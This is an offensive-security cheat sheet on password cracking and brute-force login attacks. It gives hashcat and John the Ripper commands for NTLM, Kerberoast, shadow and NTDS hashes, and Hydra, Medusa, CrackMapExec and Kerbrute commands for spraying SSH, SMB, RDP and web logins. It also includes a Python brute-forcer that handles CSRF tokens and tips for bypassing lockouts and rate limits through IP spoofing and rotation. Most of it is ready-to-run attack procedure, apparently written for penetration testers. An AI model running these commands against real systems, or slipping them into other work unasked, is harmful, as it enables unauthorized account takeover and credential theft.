# Password Cracking & Brute Force Methodology

---

## 1. Hash Identification

- [ ] Identify hash type before cracking:
```bash
# hashid
hashid '$2y$10$XrrpX8RD6IFvBwtzPuTlcO'
hashid -m '$6$rounds=5000$salt$hash'   # -m shows hashcat mode

# hash-identifier
hash-identifier

# haiti
haiti '$apr1$salt$hash'
```

### Common Hash Formats

| Hash | Example Start | Hashcat Mode | John Format |
|------|--------------|--------------|-------------|
| MD5 | `5d41402abc4b` | 0 | raw-md5 |
| SHA1 | `aaf4c61ddcc5` | 100 | raw-sha1 |
| SHA256 | `2cf24dba5fb0` | 1400 | raw-sha256 |
| SHA512 | `cf83e1357eef` | 1700 | raw-sha512 |
| NTLM | `32ed87bdb5fdc` | 1000 | nt |
| NTLMv2 | `admin::DOMAIN:` | 5600 | netntlmv2 |
| bcrypt | `$2a$`, `$2b$`, `$2y$` | 3200 | bcrypt |
| md5crypt | `$1$` | 500 | md5crypt |
| sha512crypt | `$6$` | 1800 | sha512crypt |
| sha256crypt | `$5$` | 7400 | sha256crypt |
| APR1 (Apache) | `$apr1$` | 1600 | — |
| Kerberos TGS (Kerberoast) | `$krb5tgs$23$` | 13100 | krb5tgs |
| Kerberos AS-REP | `$krb5asrep$23$` | 18200 | krb5asrep |
| MSSQL 2012+ | `0x0200` | 1731 | mssql12 |
| MySQL 4.1+ | `*6BB4837EB74329` | 300 | mysql-sha1 |
| PostgreSQL MD5 | `md5` + 32 hex | — | — |
| Oracle 11g+ | `S:` prefix | 112 | oracle11 |
| WordPress | `$P$B` | 400 | phpass |
| Drupal 7 | `$S$D` | 7900 | drupal7 |
| Joomla | (md5 variants) | 11 / 400 | — |
| Django SHA256 | `pbkdf2_sha256$` | 10000 | django |
| WPA/WPA2 | `.hccapx` / `.22000` | 22000 | wpapsk |
| Cisco Type 5 | `$1$` | 500 | md5crypt |
| Cisco Type 7 | numeric string | — | cisco7 (decrypt, not crack) |
| Cisco Type 9 | `$9$` | 9300 | — |
| NetNTLMv1 | `user::domain:LM:NT:challenge` | 5500 | netntlm |

---

## 2. Hashcat

### Basic Usage
```bash
# Dictionary attack
hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked
hashcat -m MODE hash.txt --show

# Restore interrupted session
hashcat --restore
```

### Attack Modes (-a)

| Mode | Name | Example |
|------|------|---------|
| 0 | Dictionary | `-a 0 wordlist.txt` |
| 1 | Combination | `-a 1 list1.txt list2.txt` (word1+word2) |
| 3 | Brute-force/Mask | `-a 3 ?u?l?l?l?d?d?d?d` |
| 6 | Hybrid dict+mask | `-a 6 wordlist.txt ?d?d?d` |
| 7 | Hybrid mask+dict | `-a 7 ?d?d?d wordlist.txt` |

### Mask Charsets

| Placeholder | Charset |
|------------|---------|
| `?l` | a-z |
| `?u` | A-Z |
| `?d` | 0-9 |
| `?s` | special chars (!@#$%...) |
| `?a` | all printable (?l?u?d?s) |
| `?b` | 0x00-0xff (binary) |

### Mask Examples
```bash
# 8-char password: Uppercase + 6 lowercase + digit
hashcat -m 1000 hash.txt -a 3 '?u?l?l?l?l?l?l?d'

# Company name + digits: Company2024
hashcat -m 1000 hash.txt -a 6 company_words.txt '?d?d?d?d'

# Custom charset: uppercase + digits only
hashcat -m 1000 hash.txt -a 3 -1 '?u?d' '?1?1?1?1?1?1?1?1'

# Incremental length 1-8
hashcat -m 1000 hash.txt -a 3 --increment --increment-min 1 --increment-max 8 '?a?a?a?a?a?a?a?a'
```

### Best Rule Files (in order of effectiveness)
```bash
# Built-in
/usr/share/hashcat/rules/best64.rule          # Fast, good hit rate
/usr/share/hashcat/rules/rockyou-30000.rule    # Thorough
/usr/share/hashcat/rules/d3ad0ne.rule          # Classic
/usr/share/hashcat/rules/dive.rule             # Deep (slow)
/usr/share/hashcat/rules/toggles1.rule         # Case toggling
/usr/share/hashcat/rules/OneRuleToRuleThemAll.rule  # Community favorite

# Download OneRuleToRuleThemAll if not present
wget https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule
```

### Performance Flags
```bash
# Force CPU (no GPU)
hashcat -m MODE hash.txt wordlist.txt -D 1

# Optimize for speed
hashcat -m MODE hash.txt wordlist.txt -O    # optimized kernels (limits pw length to 32)
hashcat -m MODE hash.txt wordlist.txt -w 3  # workload: 1=low, 2=default, 3=high, 4=nightmare

# Status
hashcat -m MODE hash.txt wordlist.txt --status --status-timer=10
```

### Hashcat Potfile
```bash
# All cracked hashes stored in:
~/.local/share/hashcat/hashcat.potfile

# Check without re-cracking
hashcat -m MODE hash.txt --show

# Ignore potfile (re-crack)
hashcat -m MODE hash.txt wordlist.txt --potfile-disable
```

---

## 3. John the Ripper

### Basic Usage
```bash
# Auto-detect hash format
john hash.txt

# Specify format
john --format=raw-md5 hash.txt
john --format=nt hash.txt
john --format=bcrypt hash.txt

# With wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Show cracked
john --show hash.txt
john --show --format=nt hash.txt
```

### Extraction Tools (john suite)
```bash
# Extract hashes from files for John
ssh2john id_rsa > id_rsa.hash           # SSH private key
zip2john backup.zip > zip.hash           # ZIP file
rar2john backup.rar > rar.hash           # RAR file
keepass2john Database.kdbx > kp.hash     # KeePass database
office2john document.docx > doc.hash     # Office documents
pdf2john protected.pdf > pdf.hash        # PDF files
pfx2john cert.pfx > pfx.hash            # PFX/PKCS12 certificates
bitlocker2john image.raw > bl.hash       # BitLocker
gpg2john private.key > gpg.hash          # GPG keys
krb2john ticket.kirbi > krb.hash         # Kerberos tickets
```

### John Rules
```bash
# Use rules
john --wordlist=wordlist.txt --rules=best64 hash.txt
john --wordlist=wordlist.txt --rules=KoreLogic hash.txt

# List available rules
john --list=rules

# Custom rule in john.conf (/etc/john/john.conf):
# [List.Rules:MyRules]
# Az"[0-9][0-9]"         # Append 2 digits
# Az"[!@#$%]"            # Append special char
# c                       # Capitalize first letter
# cAz"[0-9][0-9]"        # Capitalize + append 2 digits
# cAz"[0-9][0-9][!@#$]"  # Capitalize + 2 digits + special
```

### John Rule Syntax Quick Reference

| Rule | Effect | Example |
|------|--------|---------|
| `:` | Do nothing (passthrough) | password → password |
| `c` | Capitalize first, lower rest | password → Password |
| `C` | Lowercase first, upper rest | password → pASSWORD |
| `u` | Uppercase all | password → PASSWORD |
| `l` | Lowercase all | PASSWORD → password |
| `t` | Toggle case of all | password → PASSWORD |
| `r` | Reverse | password → drowssap |
| `d` | Duplicate | password → passwordpassword |
| `$X` | Append char X | password → passwordX |
| `^X` | Prepend char X | password → Xpassword |
| `Az"STR"` | Append string | password → passwordSTR |
| `A0"STR"` | Prepend string | password → STRpassword |
| `sXY` | Replace X with Y | password → p@ssword (s=a@) |
| `[` | Delete first char | password → assword |
| `]` | Delete last char | password → passwor |

---

## 4. Hydra — Online Brute Force

### HTTP Forms
```bash
# POST form login
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# GET form login
hydra -l admin -P wordlist.txt TARGET http-get-form \
  "/login.php:user=^USER^&pass=^PASS^:F=Login failed"

# HTTPS
hydra -l admin -P wordlist.txt TARGET https-post-form \
  "/login:user=^USER^&password=^PASS^:F=incorrect"

# With cookies/headers
hydra -l admin -P wordlist.txt TARGET http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=failed:H=Cookie: session=abc123"
```

### Common Protocols
```bash
# SSH
hydra -l root -P wordlist.txt TARGET ssh -t 4

# FTP
hydra -l admin -P wordlist.txt TARGET ftp

# SMB
hydra -l administrator -P wordlist.txt TARGET smb

# RDP
hydra -l admin -P wordlist.txt TARGET rdp -t 1

# MySQL
hydra -l root -P wordlist.txt TARGET mysql

# MSSQL
hydra -l sa -P wordlist.txt TARGET mssql

# PostgreSQL
hydra -l postgres -P wordlist.txt TARGET postgres

# WinRM
hydra -l administrator -P wordlist.txt TARGET winrm

# SNMP
hydra -P community_strings.txt TARGET snmp

# LDAP
hydra -l 'CN=admin,DC=domain,DC=local' -P wordlist.txt TARGET ldap3

# Telnet
hydra -l admin -P wordlist.txt TARGET telnet

# IMAP
hydra -l user@domain.com -P wordlist.txt TARGET imap

# POP3
hydra -l user -P wordlist.txt TARGET pop3

# SMTP (auth)
hydra -l user@domain.com -P wordlist.txt TARGET smtp
```

### HTTP Basic Auth
```bash
hydra -l admin -P wordlist.txt TARGET http-get /manager/html

# Tomcat manager
hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
  -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt \
  -f TARGET -s 8080 http-get /manager/html
```

### Useful Flags
```bash
-l USER          # Single username
-L users.txt     # Username list
-p PASS          # Single password
-P wordlist.txt  # Password list
-C creds.txt     # Colon-separated user:pass file
-t 4             # Threads (default 16, lower for sensitive services)
-f               # Stop on first valid pair
-s PORT          # Custom port
-V               # Verbose (show each attempt)
-I               # Skip restore file
-e nsr           # Try: n=null password, s=login as password, r=reversed login
```

---

## 5. Medusa — Online Brute Force

```bash
# SSH
medusa -h TARGET -u root -P wordlist.txt -M ssh -t 4

# FTP
medusa -h TARGET -u admin -P wordlist.txt -M ftp

# HTTP (Basic Auth)
medusa -h TARGET -u admin -P wordlist.txt -M http -m DIR:/admin

# SMB
medusa -h TARGET -u administrator -P wordlist.txt -M smbnt

# MySQL
medusa -h TARGET -u root -P wordlist.txt -M mysql

# RDP
medusa -h TARGET -u admin -P wordlist.txt -M rdp

# Multiple hosts
medusa -H hosts.txt -u admin -P wordlist.txt -M ssh

# Useful flags
-h HOST          # Target host
-H hosts.txt     # Host list
-u USER          # Username
-U users.txt     # Username list
-p PASS          # Password
-P wordlist.txt  # Password list
-M MODULE        # Protocol module
-t THREADS       # Parallel connections
-f               # Stop after first valid
-n PORT          # Custom port
```

---

## 6. CrackMapExec / NetExec — Network Spraying

```bash
# SMB password spray
crackmapexec smb TARGET -u users.txt -p 'Password123'
crackmapexec smb TARGET -u users.txt -p passwords.txt --no-bruteforce  # spray (1-to-1 match)
crackmapexec smb TARGET -u users.txt -p passwords.txt                   # brute (all combos)

# WinRM
crackmapexec winrm TARGET -u admin -p passwords.txt

# MSSQL
crackmapexec mssql TARGET -u sa -p passwords.txt

# LDAP
crackmapexec ldap TARGET -u users.txt -p 'Password123'

# Check local admin (Pwn3d!)
crackmapexec smb TARGET -u admin -p 'Password123' --local-auth

# Hash spraying (Pass-the-Hash)
crackmapexec smb TARGET -u administrator -H 'NTLM_HASH_HERE'
```

---

## 7. Wordlist Generation & Mutation

### CeWL — Custom Wordlist from Website
```bash
# Generate wordlist from target website
cewl http://TARGET -m 5 -w custom_wordlist.txt
# -m 5 = minimum word length 5

# With depth
cewl http://TARGET -d 3 -m 5 -w custom_wordlist.txt

# Include emails
cewl http://TARGET -m 5 -w words.txt --email --email_file emails.txt
```

### CUPP — Common User Password Profiler
```bash
# Interactive mode (builds wordlist from personal info)
cupp -i
# Enter: name, birthdate, partner name, pet name, company, etc.
# Generates targeted wordlist with mutations

# Download common password lists
cupp -l
```

### Username Generation
```bash
# username-anarchy
./username-anarchy --input-file fullnames.txt --select-format first.last

# Manual patterns from "John Smith":
# john.smith, j.smith, jsmith, john.s, smithj, john_smith, smith.john
```

### Hashcat Rule-Based Wordlist Generation
```bash
# Generate mutated wordlist without cracking
hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt

# Chain multiple rules (each word gets rule1 THEN rule2)
hashcat --stdout wordlist.txt -r rule1.rule -r rule2.rule > mutated.txt
```

### Custom Hashcat Rules — Common Patterns

```bash
# Save as custom.rule:

# Passthrough
:

# Capitalize first letter
c

# Capitalize + append digits
cAz"1"
cAz"12"
cAz"123"
cAz"2024"
cAz"2025"

# Capitalize + append digit + special
cAz"1!"
cAz"123!"
cAz"2024!"

# Leet speak substitutions
sa@
se3
si1
so0
ss$
sa@se3
sa@se3si1so0

# Capitalize + leet
csa@
cse3
csa@se3

# Append common suffixes
Az"!"
Az"@"
Az"#"
Az"$"
Az"1!"
Az"12!"
Az"123!"
Az"!!"
Az"@123"

# Prepend common prefixes
A0"!"
A0"@"
A0"123"

# Toggle + append
TcAz"1"
```

### Kwprocessor — Keyboard Walk Generator
```bash
# Generate keyboard walk patterns (qwerty, 1qaz, etc.)
kwp basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route > keywalks.txt
```

### Princeprocessor — PRINCE Attack
```bash
# Combines words from wordlist in intelligent ways
pp64.bin wordlist.txt > prince_output.txt
# Generates: word1word2, word1word2word3, etc.
```

---

## 8. Password Spraying Strategy

### Methodology
- [ ] Enumerate valid usernames first (Kerbrute, LDAP, SMTP, web app)
- [ ] Check password policy: lockout threshold, lockout duration
- [ ] Spray ONE password at a time across ALL users
- [ ] Wait between sprays (respect lockout window)
- [ ] Common spray passwords:
```
Season+Year:    Spring2024, Summer2024, Fall2024, Winter2024
Company+digits: CompanyName1!, CompanyName123
Month+Year:     January2024!, October2024!
Welcome+digits: Welcome1, Welcome1!, Welcome123
Password+digits: Password1, Password1!, Password123!
```

### Kerbrute (AD environments)
```bash
# Username enumeration
kerbrute userenum -d domain.local --dc DC_IP usernames.txt

# Password spray
kerbrute passwordspray -d domain.local --dc DC_IP users.txt 'Password123!'

# Brute force single user
kerbrute bruteuser -d domain.local --dc DC_IP passwords.txt admin
```

---

## 9. Cracking Specific Hash Types — Quick Reference

### NTLM (Windows)
```bash
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --format=nt ntlm_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### NTLMv2 (Responder captures)
```bash
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
john --format=netntlmv2 ntlmv2_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Kerberoast (TGS tickets)
```bash
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --format=krb5tgs tgs_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### AS-REP Roast
```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
john --format=krb5asrep asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### SSH Key Passphrase
```bash
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 22931 id_rsa.hash /usr/share/wordlists/rockyou.txt  # RSA/DSA (OpenSSH new format)
```

### ZIP / RAR / 7z
```bash
zip2john backup.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
# Hashcat: -m 13600 (WinZip), -m 17200 (PKZIP), -m 17210 (PKZIP mixed)

rar2john backup.rar > rar.hash
john rar.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### KeePass
```bash
keepass2john Database.kdbx > kp.hash
john kp.hash --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 13400 kp.hash /usr/share/wordlists/rockyou.txt
```

### WPA/WPA2 WiFi
```bash
# Convert cap to hashcat format
hcxpcapngtool capture.cap -o wifi.22000
hashcat -m 22000 wifi.22000 /usr/share/wordlists/rockyou.txt
```

### /etc/shadow (Linux)
```bash
# Unshadow first
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt
# OR directly with hashcat:
# sha512crypt ($6$) = -m 1800
# sha256crypt ($5$) = -m 7400
# md5crypt ($1$) = -m 500
```

### Active Directory NTDS.dit
```bash
# Extract with secretsdump
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile ntds_dump
# Crack extracted NTLM hashes
hashcat -m 1000 ntds_dump.ntds /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## 10. Web Application Brute Force — Advanced

### Burp Suite Intruder
- Capture login request → Send to Intruder
- Set payload positions on username/password fields
- Attack types: Sniper (single param), Pitchfork (parallel lists), Cluster Bomb (all combos)
- Filter results by response length/status code

### ffuf — Web Fuzzing + Brute Force
```bash
# POST form brute force
ffuf -u http://TARGET/login -X POST \
  -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/wordlists/rockyou.txt \
  -fc 401 -fs <fail_size>

# Basic Auth
ffuf -u http://admin:FUZZ@TARGET/manager/html \
  -w /usr/share/wordlists/rockyou.txt \
  -fc 401

# With cookies
ffuf -u http://TARGET/login -X POST \
  -d "user=admin&pass=FUZZ" \
  -H "Cookie: session=abc123" \
  -w wordlist.txt -fc 403 -fs <fail_size>
```

### WPScan (WordPress)
```bash
# xmlrpc brute (fastest for WordPress)
wpscan --url http://TARGET --password-attack xmlrpc -U admin -P /usr/share/wordlists/rockyou.txt -t 50

# wp-login brute
wpscan --url http://TARGET --password-attack wp-login -U admin,editor -P wordlist.txt
```

### CSRF Token Handling
```bash
# Python approach for CSRF-protected forms
import requests
from bs4 import BeautifulSoup

s = requests.Session()
r = s.get('http://TARGET/login')
soup = BeautifulSoup(r.text, 'html.parser')
token = soup.find('input', {'name': 'csrf_token'})['value']

for password in open('wordlist.txt'):
    pw = password.strip()
    r = s.post('http://TARGET/login', data={
        'username': 'admin',
        'password': pw,
        'csrf_token': token
    })
    if 'Invalid' not in r.text:
        print(f'[+] Found: {pw}')
        break
    # Re-fetch token for next attempt
    soup = BeautifulSoup(r.text, 'html.parser')
    token = soup.find('input', {'name': 'csrf_token'})['value']
```

### Rate Limit / Lockout Bypass
- [ ] IP rotation (X-Forwarded-For header spoofing)
- [ ] Interleave valid logins to reset counter (see `brute_ip_block.py`)
- [ ] Slow brute with delays between attempts
- [ ] Distribute across multiple source IPs
- [ ] Try API endpoints instead of web form (may have different rate limits)
- [ ] Use HEAD vs POST requests
- [ ] Password spray (1 password, many users) instead of brute (many passwords, 1 user)

---

## 11. Wordlist Locations (Kali)

```bash
/usr/share/wordlists/rockyou.txt                          # Classic, 14M passwords
/usr/share/wordlists/seclists/Passwords/                   # SecLists collection
/usr/share/wordlists/seclists/Passwords/Common-Credentials/
/usr/share/wordlists/seclists/Passwords/Default-Credentials/
/usr/share/wordlists/seclists/Usernames/
/usr/share/metasploit-framework/data/wordlists/
/usr/share/john/password.lst
/usr/share/nmap/nselib/data/passwords.lst
```

---

## 12. Decision Tree

```
Password Cracking Task
├── OFFLINE (have hash file)
│   ├── Identify hash type (hashid -m)
│   ├── Fast hashes (MD5/NTLM/SHA1)?
│   │   ├── rockyou.txt + rules (best64 → OneRule → dive)
│   │   ├── Mask attack for patterns (Company2024!)
│   │   └── Combinator/Prince for complex
│   ├── Slow hashes (bcrypt/scrypt/Argon2)?
│   │   ├── Small targeted wordlist + minimal rules
│   │   └── Spray common passwords only
│   └── Special format (SSH key/ZIP/KeePass)?
│       └── john2X extraction → john/hashcat
│
├── ONLINE (brute force login)
│   ├── Check lockout policy first!
│   ├── Web form → Hydra http-post-form / ffuf / Burp
│   │   └── CSRF token? → Script with token extraction
│   ├── SSH/FTP/SMB → Hydra / Medusa
│   ├── AD/Kerberos → Kerbrute spray
│   └── Rate limited? → Spray, IP rotation, interleave valid logins
│
└── GENERATE WORDLIST
    ├── CeWL (from target website)
    ├── CUPP (from personal info)
    ├── Hashcat --stdout with rules (mutate existing list)
    └── Custom: Season+Year, Company+digits patterns
```
